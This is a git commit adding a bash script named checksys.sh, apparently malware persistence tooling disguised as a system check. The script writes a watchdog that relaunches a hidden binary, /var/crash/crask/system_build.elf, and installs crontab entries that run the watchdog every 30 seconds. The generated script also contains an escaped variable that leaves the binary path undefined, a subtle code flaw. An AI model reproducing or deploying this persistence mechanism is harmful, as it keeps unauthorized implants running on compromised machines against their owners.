a92abeede3ecfa100d8bafee9608b8d7e60d5195
DARKGUY <richardlevip2021@icloud.com>
2025-05-04 18:01:08 +0700

    Create checksys.sh

---
+++ checksys.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+SHELL_PATH="/var/crash/crask/system_build.elf"
+CHECK_SCRIPT="/var/crash/crask/checksys.sh"
+
+cat <<EOF > "$CHECK_SCRIPT"
+#!/bin/bash
+if ! pgrep -f "\$SHELL_PATH" > /dev/null; then
+  nohup \$SHELL_PATH > /dev/null 2>&1 &
+fi
+EOF
+
+chmod +x "$CHECK_SCRIPT"
+
+
+( crontab -l 2>/dev/null; echo "*/1 * * * * $CHECK_SCRIPT"; echo "*/1 * * * * sleep 30; $CHECK_SCRIPT" ) | crontab -
+
+echo "[+] Done."
